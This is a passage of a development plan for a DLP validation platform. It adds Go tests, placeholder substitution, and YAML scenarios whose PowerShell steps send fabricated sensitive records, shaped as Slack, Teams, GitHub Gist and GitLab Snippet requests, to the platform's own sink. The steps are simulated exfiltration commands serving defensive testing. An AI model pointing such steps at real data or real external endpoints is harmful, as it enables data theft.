	"POST /webhooksink/github/gists":                                                    true,
	"POST /webhooksink/gitlab/api/v4/snippets":                                          true,
```

- [ ] **Step 4: Build and verify the RBAC drift test passes**

Run: `cd orchestrator && go build ./... 2>&1`
Expected: clean build, no errors.

Run: `cd orchestrator && go test ./internal/api/... -run TestRBACMatrix_NoDrift -v 2>&1 | tail -20`
Expected: PASS.

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/api/routes.go internal/api/rbac_matrix_test.go
git add internal/api/routes.go internal/api/rbac_matrix_test.go
git commit -m "feat(webhooksink): mount webhook/code-repository sink routes and register with RBAC drift allowlist"
git push
```

---

## Task 5: Placeholder substitution in `internal/api/dlp_sink.go`

**Files:**
- Modify: `orchestrator/internal/api/dlp_sink.go`
- Modify: `orchestrator/internal/api/dlp_sink_test.go`

**Interfaces:**
- Consumes: nothing new — reuses the existing unconditional `{{SINK_TOKEN}}` block.
- Produces: `func webhookSinkHost(publicBaseURL string) string`, `func webhookSinkPort(publicBaseURL string) string`.

- [ ] **Step 1: Write the failing tests**

Append to `orchestrator/internal/api/dlp_sink_test.go`:

```go
func TestIssueSinkTokensAndSubstitute_WebhookPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.004", Command: "$uri = 'https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T0/B0/X0'; $token = '{{SINK_TOKEN}}'"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-webhook-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_WEBHOOK_HOST}}") || strings.Contains(cmd, "{{SINK_WEBHOOK_PORT}}") {
			t.Fatalf("webhook placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if !strings.Contains(cmd, ":9443/") {
			t.Fatalf("expected SINK_WEBHOOK_PORT to be derived from publicBaseURL's own port (9443): %s", cmd)
		}

		var tokenLen int
		if err := pool.QueryRow(context.Background(),
			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-webhook-1' AND technique_id = 'T1567.004'`,
		).Scan(&tokenLen); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if tokenLen != 64 {
			t.Fatalf("token length = %d, want 64 (webhook channel reuses the existing 32-byte/64-hex-char token)", tokenLen)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_WebhookDoesNotIssueOrphanedSecondToken(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.004", Command: "$uri = 'https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T0/B0/X0'; $token = '{{SINK_TOKEN}}'"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-webhook-orphan-1", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-webhook-orphan-1' AND technique_id = 'T1567.004'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the webhook block)", count)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_CoderepoDoesNotIssueOrphanedSecondToken(t *testing.T) {
	// Same regression, for the T1567.001 (GitHub/GitLab) technique --
	// this channel spans two techniques, so both need their own coverage.
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.001", Command: "$uri = 'https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/github/gists'; $token = '{{SINK_TOKEN}}'"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-webhook-orphan-2", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-webhook-orphan-2' AND technique_id = 'T1567.001'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the webhook block)", count)
		}
	})
}

func TestWebhookSinkPort_DerivesFromPublicBaseURL(t *testing.T) {
	cases := []struct{ in, want string }{
		{"https://orchestrator.example:9443", "9443"},
		{"https://10.0.0.5:8443", "8443"},
		{"https://orchestrator.example", "443"},
	}
	for _, c := range cases {
		got := webhookSinkPort(c.in)
		if got != c.want {
			t.Errorf("webhookSinkPort(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestWebhookSinkHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_WEBHOOK_HOST", "webhook-external.example.net")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.004", Command: "target={{SINK_WEBHOOK_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-webhook-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "webhook-external.example.net") {
			t.Fatalf("expected the SINK_WEBHOOK_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
		}
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/api/... -run "Webhook|Coderepo" -v 2>&1 | head -40`
Expected: FAIL — `webhookSinkHost`/`webhookSinkPort` undefined, placeholders unsubstituted.

- [ ] **Step 3: Write the implementation**

In `orchestrator/internal/api/dlp_sink.go`, add a new branch to `issueSinkTokensAndSubstitute` immediately after the existing cloud storage branch (after its closing `}`):

```go
		if strings.Contains(steps[i].Command, "{{SINK_WEBHOOK_HOST}}") || strings.Contains(steps[i].Command, "{{SINK_WEBHOOK_PORT}}") {
			// Same reasoning as the cloud storage block above: does NOT
			// issue its own token. Every real webhook-wired step's
			// command contains {{SINK_TOKEN}} too (embedded in the
			// message text / Gist-Snippet filename) -- the unconditional
			// block above already issues and substitutes it whenever
			// present.
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_WEBHOOK_HOST}}", webhookSinkHost(publicBaseURL))
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_WEBHOOK_PORT}}", webhookSinkPort(publicBaseURL))
		}
```

Add the two new helper functions after `cloudSinkPort`:

```go
// webhookSinkHost resolves the {{SINK_WEBHOOK_HOST}} placeholder: an
// explicit SINK_WEBHOOK_HOST environment override if set, otherwise the
// same derivation dnsServerHost/cloudSinkHost already use -- no new
// derivation logic.
func webhookSinkHost(publicBaseURL string) string {
	if v := os.Getenv("SINK_WEBHOOK_HOST"); v != "" {
		return v
	}
	return dnsServerHost(publicBaseURL)
}

// webhookSinkPort resolves the {{SINK_WEBHOOK_PORT}} placeholder. Same
// reasoning as cloudSinkPort: this channel's routes live on the main API
// server's own port, so the port is derived from publicBaseURL directly
// rather than defaulting to a hardcoded value, with SINK_WEBHOOK_PORT
// available as an explicit override for the rare case where this
// channel's routes are deliberately reachable on a different externally-
// published port than the rest of the API.
func webhookSinkPort(publicBaseURL string) string {
	if v := os.Getenv("SINK_WEBHOOK_PORT"); v != "" {
		return v
	}
	if u, err := url.Parse(publicBaseURL); err == nil && u.Port() != "" {
		return u.Port()
	}
	return "443" // publicBaseURL has no explicit port -- assume default HTTPS
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/api/... -run "Webhook|Coderepo" -v`
Expected: PASS for all 5 new tests.

- [ ] **Step 5: Run the full `internal/api` suite to confirm no regressions**

Run: `cd orchestrator && go test ./internal/api/...`
Expected: PASS, including all existing placeholder tests and `TestRBACMatrix_NoDrift` unchanged.

- [ ] **Step 6: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/api/dlp_sink.go internal/api/dlp_sink_test.go
git add internal/api/dlp_sink.go internal/api/dlp_sink_test.go
git commit -m "feat(webhooksink): add SINK_WEBHOOK_HOST/PORT placeholder substitution"
git push
```

---

## Task 6: V1 scenario content — two scenarios, two techniques

**Files:**
- Create: `orchestrator/scenarios/dlp-exfiltration-webhook.yaml`
- Create: `orchestrator/scenarios/dlp-exfiltration-webhook.yaml.sig`
- Create: `orchestrator/scenarios/dlp-exfiltration-coderepo.yaml`
- Create: `orchestrator/scenarios/dlp-exfiltration-coderepo.yaml.sig`
- Modify: `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml`
- Modify: `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig`

- [ ] **Step 1: Add both detection-profile entries**

In `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml`, add `T1567.004` and `T1567.001` to the `technique_ids` list (the current list ends `..., T1048.003, T1567.002]` — append `, T1567.004, T1567.001` before the closing bracket), and append two new entries after the existing `dlp-cloud-storage-block` entry:

```yaml
  - id: dlp-webhook-block
    provider: trellix_dlp
    type: dlp
    outcome_family: dlp
    expected_outcome: Block
    verification: automatic
    confidence: required
    finding:
      severity: High
      title: "DLP/CASB controls did not block webhook-shaped exfiltration of regulated data"
      remediation: >-
        Confirm DLP/CASB content inspection recognizes and inspects
        traffic shaped like Slack and Microsoft Teams incoming-webhook
        POST requests for PAN/Aadhaar/SWIFT/UPI/credit-card patterns,
        and blocks or quarantines the message rather than allowing it
        to reach the destination.
      reference: "MITRE ATT&CK T1567.004 — Exfiltration Over Webhook"
  - id: dlp-coderepo-block
    provider: trellix_dlp
    type: dlp
    outcome_family: dlp
    expected_outcome: Block
    verification: automatic
    confidence: required
    finding:
      severity: High
      title: "DLP/CASB controls did not block code-repository-API-shaped exfiltration of regulated data"
      remediation: >-
        Confirm DLP/CASB content inspection recognizes and inspects
        traffic shaped like GitHub Gist and GitLab Snippet creation API
        requests (path structure, auth-header presence, and JSON body
        content) for PAN/Aadhaar/SWIFT/UPI/credit-card patterns, and
        blocks the request rather than allowing it to complete.
      reference: "MITRE ATT&CK T1567.001 — Exfiltration to Code Repository"
```

- [ ] **Step 2: Write the webhook scenario (Slack + Teams, T1567.004)**

```yaml
id: dlp-exfiltration-webhook
name: DLP Exfiltration Validation — Webhook Channels
description: >
  Attempts to exfiltrate the same synthetic multi-type sensitive record
  used by every other channel in this program (fabricated PAN, Aadhaar,
  SWIFT/BIC, UPI VPA, and credit-card patterns), this time shaped as
  Slack and Microsoft Teams incoming-webhook POST requests.

  Seventh channel of the sink-verified generation of DLP testing (see
  docs/superpowers/specs/2026-09-01-webhook-exfiltration-channel-design.md).
  Verdict comes from whether the platform's own webhook-shaped route
  (internal/webhooksink) ever receives a request whose embedded token
  matches this run -- ground truth resolved server-side, never from
  anything the step's own script can locally confirm.

  Fidelity: each step reproduces its provider's real path structure and
  JSON body shape -- including that real Slack/Teams incoming webhooks
  carry NO separate auth header, since the webhook URL itself is the
  secret -- but does not use a real Slack/Teams account or webhook URL.
  This is a traffic-shape simulation only.

  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
  real. The sink stores only a hash of the received payload, never the
  raw content. Every destination is this same on-prem orchestrator's own
  main API server -- no external Slack/Teams workspace is ever
  contacted. Windows only.
author: Audspect Research
executable: true
supported_os: [windows]
tags:
  - dlp
  - data-protection-validation
  - exfiltration
  - webhook
  - windows
  - mitre-attack
  - bfsi
  - india
mitre_phases:
  - collection
  - exfiltration

steps:

  # ---------------------------------------------------------------------------
  # Provider 1 — Slack-compatible incoming-webhook traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Slack-Compatible Webhook Traffic Simulation (T1567.004)"
    technique_id: T1567.004
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own Slack-webhook-shaped endpoint (this same on-prem orchestrator). No real Slack workspace, no real webhook URL, no external destination -- traffic-shape simulation only."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Slack-webhook-shaped HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $body = @{ text = "$token`n$csvContent" } | ConvertTo-Json -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: slack_webhook_result=success"
        Write-Output "EXEC T1567.004: Slack-compatible webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
      } catch {
        Write-Output "DLP_OBSERVATION: slack_webhook_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.004: Slack-compatible webhook traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the webhook sink
      # actually received a request with a matching token, resolved
      # server-side by internal/webhooksink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Provider 2 — Microsoft Teams-compatible incoming-webhook traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Microsoft Teams-Compatible Webhook Traffic Simulation (T1567.004)"
    technique_id: T1567.004
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own Teams-webhook-shaped endpoint (this same on-prem orchestrator). No real Microsoft 365 tenant, no real webhook URL, no external destination -- traffic-shape simulation only."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Microsoft-Teams-webhook-shaped HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $body = @{ text = "$token`n$csvContent" } | ConvertTo-Json -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/teams/webhookb2/00000000-0000-0000-0000-000000000000/IncomingWebhook/11111111111111111111111111111111/22222222-2222-2222-2222-222222222222"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: teams_webhook_result=success"
        Write-Output "EXEC T1567.004: Microsoft Teams-compatible webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-TEAMS]"
      } catch {
        Write-Output "DLP_OBSERVATION: teams_webhook_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.004: Microsoft Teams-compatible webhook traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-TEAMS]"
      }
      # See the Slack step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""
```

- [ ] **Step 3: Write the code-repository scenario (GitHub + GitLab, T1567.001)**

```yaml
id: dlp-exfiltration-coderepo
name: DLP Exfiltration Validation — Code Repository API Channels
description: >
  Attempts to exfiltrate the same synthetic multi-type sensitive record
  used by every other channel in this program, this time shaped as
  GitHub Gist and GitLab Snippet creation API requests -- a distinct
  abuse primitive from a real incoming webhook (Slack/Teams,
  dlp-exfiltration-webhook.yaml), which is why it maps to a different
  ATT&CK technique.

  Seventh channel (second half) of the sink-verified generation of DLP
  testing (see
  docs/superpowers/specs/2026-09-01-webhook-exfiltration-channel-design.md).
  Verdict comes from whether the platform's own code-repository-API-
  shaped route (internal/webhooksink) ever receives a request whose
  embedded token matches this run -- ground truth resolved server-side.

  Fidelity: each step reproduces its provider's real path structure,
  auth-header presence (Authorization for GitHub, PRIVATE-TOKEN for
  GitLab -- neither validated for real authenticity, presence fidelity
  only), and JSON body shape, but does not use a real GitHub/GitLab
  account or API token. This is a traffic-shape simulation only.

  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
  real. The sink stores only a hash of the received payload. Every
  destination is this same on-prem orchestrator -- no external
  GitHub/GitLab account is ever contacted. Windows only.
author: Audspect Research
executable: true
supported_os: [windows]
tags:
  - dlp
  - data-protection-validation
  - exfiltration
  - code-repository
  - windows
  - mitre-attack
  - bfsi
  - india
mitre_phases:
  - collection
  - exfiltration

steps:

  # ---------------------------------------------------------------------------
  # Provider 1 — GitHub Gist-compatible traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — GitHub Gist-Compatible Traffic Simulation (T1567.001)"
    technique_id: T1567.001
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own GitHub-Gist-API-shaped endpoint (this same on-prem orchestrator). No real GitHub account, no real personal access token, no external destination -- traffic-shape simulation only, not an authenticated GitHub API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: GitHub-Gist-API-shaped HTTPS POST (path, Authorization header, JSON body) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $files = @{ "$token.dat" = @{ content = $csvContent } }
      $body = @{ description = 'bas-sim'; public = $false; files = $files } | ConvertTo-Json -Depth 5 -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/github/gists"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body `
          -Headers @{ 'Authorization' = 'token bas-sim-fake-pat-0000000000000000' } `
          -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: github_gist_result=success"
        Write-Output "EXEC T1567.001: GitHub Gist-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITHUB]"
      } catch {
        Write-Output "DLP_OBSERVATION: github_gist_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.001: GitHub Gist-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITHUB]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the code-repository
      # sink actually received a request with a matching token, resolved
      # server-side by internal/webhooksink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Provider 2 — GitLab Snippet-compatible traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — GitLab Snippet-Compatible Traffic Simulation (T1567.001)"
    technique_id: T1567.001
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own GitLab-Snippet-API-shaped endpoint (this same on-prem orchestrator). No real GitLab account, no real private token, no external destination -- traffic-shape simulation only, not an authenticated GitLab API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: GitLab-Snippet-API-shaped HTTPS POST (path, PRIVATE-TOKEN header, JSON body) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $body = @{ title = 'bas-sim'; visibility = 'private'; file_name = "$token.dat"; content = $csvContent } | ConvertTo-Json -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/gitlab/api/v4/snippets"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body `
          -Headers @{ 'PRIVATE-TOKEN' = 'bas-sim-fake-token-0000000000000000' } `
          -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: gitlab_snippet_result=success"
        Write-Output "EXEC T1567.001: GitLab Snippet-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITLAB]"
      } catch {
        Write-Output "DLP_OBSERVATION: gitlab_snippet_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.001: GitLab Snippet-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITLAB]"
      }
      # See the GitHub step above for why this step's graded verdict
      # never comes from this script's own success/failure.
    cleanup: ""
```

- [ ] **Step 4: Sign all changed/new scenario and detection-profile files**

```bash
cd orchestrator
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-webhook.yaml
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-coderepo.yaml
go run scripts/signer.go sign private_key.pem ../scenarios/detection-profiles/windows_dlp_exfiltration.yaml
```

- [ ] **Step 5: Verify both scenarios load and their signatures check out**

Create a throwaway test file `orchestrator/zzz_verify_webhook_scenarios_test.go`:

```go
package orchestrator

import (
	"testing"

	"github.com/audspect/bas/internal/scenario"
)

func TestZZZVerifyWebhookScenariosLoad(t *testing.T) {
	eng := scenario.NewEngine("../scenarios")
	if err := eng.Load(); err != nil {
		t.Fatalf("Load: %v", err)
	}

	webhook, ok := eng.Get("dlp-exfiltration-webhook")
	if !ok {
		t.Fatal("dlp-exfiltration-webhook not found after Load -- check the file and its .sig")
	}
	if len(webhook.Steps) != 2 {
		t.Fatalf("dlp-exfiltration-webhook: got %d steps, want 2", len(webhook.Steps))
	}
	for i, s := range webhook.Steps {
		if s.TechniqueID != "T1567.004" {
			t.Errorf("dlp-exfiltration-webhook step %d: TechniqueID = %q, want T1567.004", i, s.TechniqueID)
		}
	}

	coderepo, ok := eng.Get("dlp-exfiltration-coderepo")
	if !ok {
		t.Fatal("dlp-exfiltration-coderepo not found after Load -- check the file and its .sig")
	}
	if len(coderepo.Steps) != 2 {
		t.Fatalf("dlp-exfiltration-coderepo: got %d steps, want 2", len(coderepo.Steps))
	}
	for i, s := range coderepo.Steps {
		if s.TechniqueID != "T1567.001" {
			t.Errorf("dlp-exfiltration-coderepo step %d: TechniqueID = %q, want T1567.001", i, s.TechniqueID)
		}
	}
}
```

Run: `cd orchestrator && go test . -run TestZZZVerifyWebhookScenariosLoad -v`
Expected: PASS.

Delete the throwaway test file afterward — it must never be committed:

```bash
rm orchestrator/zzz_verify_webhook_scenarios_test.go
```

- [ ] **Step 6: Commit**

```bash
cd orchestrator
git add scenarios/dlp-exfiltration-webhook.yaml scenarios/dlp-exfiltration-webhook.yaml.sig \
  scenarios/dlp-exfiltration-coderepo.yaml scenarios/dlp-exfiltration-coderepo.yaml.sig \
  scenarios/detection-profiles/windows_dlp_exfiltration.yaml \
  scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig
git commit -m "feat(scenarios): webhook (T1567.004) and code-repository (T1567.001) DLP exfiltration channels"
git push
```

---

## Task 7: Full verification and handoff

**Files:** none (verification only).

- [ ] **Step 1: Run the full affected-package suite**

Run: `cd orchestrator && go test ./internal/webhooksink/... ./internal/api/... ./internal/verifysync/... ./internal/reporting/... -v 2>&1 | tail -100`
Expected: PASS throughout. In particular, confirm `TestRBACMatrix_NoDrift` passes (this task's Task 4 already folded the allowlist registration in, so this should not be a surprise) and that zero changes were needed to `internal/verifysync.annotateSinkReceipts` or `internal/reporting.dlpVerifier`.

- [ ] **Step 2: Run the broader build and gofmt check**

```bash
cd orchestrator
go build ./...
gofmt -l internal/webhooksink/*.go internal/api/dlp_sink.go internal/api/dlp_sink_test.go internal/api/routes.go internal/api/rbac_matrix_test.go
go vet ./internal/webhooksink/...
```

Expected: clean build, no gofmt output, no vet issues.

- [ ] **Step 3: Final commit if Steps 1-2 required any fixes**

If any test or build failure surfaced above required a code fix, commit and push it now with a `fix(webhooksink): ...` message. If everything was already green, this step is a no-op.

---

## Self-Review Notes

- **Spec coverage:** the two-technique split with two scenarios (Task 6), per-provider token extraction and auth-header fidelity (Tasks 2-3), rate limiting + byte ceiling (Task 1, applied in every handler), token-validated-before-receipt (every handler), placeholder substitution with the corrected `publicBaseURL`-derived port (Task 5), RBAC drift-allowlist registration folded into the routes-mounting task itself (Task 4, per the spec's explicit callout of cloud storage's regression). No section of the spec is without a corresponding task.
- **Deliberate difference from cloud storage's plan:** two scenario files (`dlp-exfiltration-webhook.yaml`, `dlp-exfiltration-coderepo.yaml`) instead of one, because this channel genuinely spans two different techniques — bundling all four providers into one scenario file under a single technique_id would have been the exact "flatten for implementation convenience" mistake the spec's own architectural principle rules out.
- **Type consistency:** `Routes(db *pgxpool.Pool) chi.Router`, `handleSlackWebhook`/`handleTeamsWebhook`/`handleGitHubGist`/`handleGitLabSnippet` (all `func(db *pgxpool.Pool) http.HandlerFunc`), `tokenExists`, `writeReceipt`, `webhookSinkHost`/`webhookSinkPort` — every name introduced in Task 1 or the spec is used identically in every later task that references it. `sharedDB`/`TestMain`/`seedToken`/`assertReceiptRecorded`/`assertNoReceipt`/`slackTeamsBody` test helpers are declared once (Task 1's `webhooksink_test.go`, mirroring `cloudsink_test.go`'s own layout) and reused as-is by `slack_test.go`, `teams_test.go`, `github_test.go`, `gitlab_test.go` — no duplicate declarations. Verified against the real `internal/cloudsink/cloudsink_test.go` and `internal/api/dlp_sink_test.go`: `testutil.MustSharedTestDB()`/`sharedDB.RunWithPool`, the `dlp_sink_tokens (token, run_id, technique_id, expires_at)` insert, the `dlp_sink_receipts (token, source_ip, payload_hash, payload_size, channel)` insert, `New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")`, and `h.issueSinkTokensAndSubstitute(ctx, runID, publicBaseURL, steps)` all match the real signatures/schema exactly.
- **Placeholder scan:** no TBD/TODO. All four scenario steps are written out in full (not "similar to Slack"), since each provider's body/header shape genuinely differs, per the spec's own emphasis.
